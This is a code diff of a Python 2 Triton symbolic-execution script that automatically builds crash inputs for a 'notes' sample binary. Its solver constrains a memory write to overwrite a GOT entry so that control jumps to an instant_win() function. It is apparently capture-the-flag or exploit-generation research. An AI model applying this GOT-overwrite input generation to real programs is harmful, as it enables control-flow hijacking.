@@ -1,7 +1,11 @@
 #!/usr/bin/env python2
 ## -*- coding: utf-8 -*-
 
-import os
+_ = """
+time ~/project/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build/triton solve-notes.py vuln-samples/notes < vuln-samples/crash-inputs/notes-1
+"""
+
+import os, sys
 from triton  import *
 from pintool import *
 import time
@@ -19,14 +23,14 @@ def solve():
     global mnode
 
     found = False
-    inputs = ['\0'] * 0x100
+    inputs = ['\0'] * 1024
     astCtxt = Triton.getAstContext()
 
     try:
         if True:
             pc = Triton.getPathConstraintsAst()
             print '[TT] Solving Path constriant...'
-            models = Triton.getModels(pc, 5)
+            models = Triton.getModels(pc, 1)
             if len(models) == 0:
                 print '[TT] Model for Path Constraint: unsat'
             else:
@@ -49,8 +53,8 @@ def solve():
             if True:
                 m = Triton.getModel(
                         astCtxt.land([
-                            astCtxt.equal(mc, astCtxt.bv(0x602060 + 0, CPUSIZE.QWORD_BIT)), # GOT Table
-                            astCtxt.equal(mnode, astCtxt.bv(0xb0, CPUSIZE.BYTE_BIT)), # instant_win() = 0x400ab0
+                            astCtxt.equal(mc, astCtxt.bv(0x602060 + 3 * 8, CPUSIZE.QWORD_BIT)), # GOT Table
+                            astCtxt.equal(mnode, astCtxt.bv(0xb2, CPUSIZE.BYTE_BIT)), # instant_win() = 0x4008b2
                         ])
                     )
                 if len(m) > 0:
@@ -64,13 +68,23 @@ def solve():
 
         if found:
             print 'Found: '
-        if True:
-            print inputs
+            # crash_inputs += ['\x08', '\x40', '\x00', '\0', '\0', '\0', '\0', '\n']
+            # crash_inputs += ['A'] * 0x10 + ['\n']
+            # print inputs
             print '%r' % ''.join(inputs).strip('\0')
             print crash_inputs
-            print '%r' % ''.join(crash_inputs)
+            print 'Crash Inputs: %r' % ''.join(crash_inputs)
+            # res = raw_input('[TT] Reading remaining stdin...')
+            res = sys.stdin.read(1024)
+            print "read stdin = '%r'" % res
+            # res += '\n' ### append stripped new line
+            crash_inputs += list(res)
+            with open('crash_inputs', 'wb') as f:
+                f.write(''.join(crash_inputs))
+            return True
         else:
             print 'not found ;('
+        return False
     except Exception, e:
         print "Exception: ", e
         exit()
@@ -109,6 +123,7 @@ def syscallsExit(threadId, std):
     global isRead
     global targetFd
     global stdin_len
+    global concrete_input_offets
 
     # print '[TT:debug] syscallsExit'
 
@@ -127,6 +142,9 @@ def syscallsExit(threadId, std):
             # if stdin_len >= 30 and stdin_len < 50: ### makes incorrect result
             if True:
                 print "Symbolized input: ", ctxt.convertMemoryToSymbolicVariable(MemoryAccess(buff+index, CPUSIZE.BYTE)) ### become slower
+            ### concretize part of stdin
+            if stdin_len in concrete_input_offets:
+                ctxt.concretizeMemory(MemoryAccess(buff+index, CPUSIZE.BYTE))
             end_time = time.time()
             print 'symbolize took %f sec' % (end_time - start_time)
             stdin_len += 1
@@ -154,7 +172,11 @@ def mycb(inst):
                 # print 'MemoryAccess LeaAst: %s' % str(mem.getLeaAst())
             if not checkWriteAccess(mem.getAddress()):
                 print "[TT] Detected memory access violation"
-                solve()
+                found = solve()
+                if found:
+                    print "[TT] Go on to phase 2"
+                    exit()
+
     return
 
 def signals(threadId, sig):
@@ -163,37 +185,6 @@ def signals(threadId, sig):
 
     solve()
 
-def mallocHandler():
-    print '[+] hooked malloc()'
-    yield 0x60000000
-    yield 0x60000000 + 0x1000
-
-customRelocation = [
-    ('malloc', mallocHandler, 0x10000000),
-]
-
-def loadBinary(path):
-    import lief
-    binary = lief.parse(path)
-    phdrs  = binary.segments
-    for phdr in phdrs:
-        size   = phdr.physical_size
-        vaddr  = phdr.virtual_address
-        print '[+] Loading 0x%06x - 0x%06x' %(vaddr, vaddr+size)
-        Triton.setConcreteMemoryAreaValue(vaddr, phdr.content)
-    return binary
-
-def makeRelocation(binary):
-    # Perform our own relocations
-    for rel in binary.pltgot_relocations:
-        symbolName = rel.symbol.name
-        symbolRelo = rel.address
-        for crel in customRelocation:
-            if symbolName == crel[0]:
-                print '[+] Hooking %s' %(symbolName)
-                Triton.setConcreteMemoryValue(MemoryAccess(symbolRelo, CPUSIZE.QWORD), crel[2])
-    return
-
 
 if __name__ == '__main__':
 
@@ -201,18 +192,9 @@ if __name__ == '__main__':
     Triton.enableMode(MODE.ALIGNED_MEMORY, True) ### **REQUIRED** (slowns, but nor leaAst becomes bvtrue)
     Triton.enableMode(MODE.ONLY_ON_SYMBOLIZED, True) ### **REQUIRED**
 
-    # Triton.enableMode(MODE.ONLY_ON_TAINTED, True) ### NOT WORKS CORRECTLY
-
-    # # Load the binary
-    # binary = loadBinary(os.path.join(os.path.dirname(__file__), 'vuln-samples', 'notes'))
-
-    # # Perform our own relocations
-    # makeRelocation(binary)
-
-    # Start JIT at the entry point
-    # startAnalysisFromEntry()
-
     startAnalysisFromSymbol('main')
+
+    concrete_input_offets = range(40)
 
     # Add callback
     insertCall(mycb, INSERT_POINT.BEFORE)
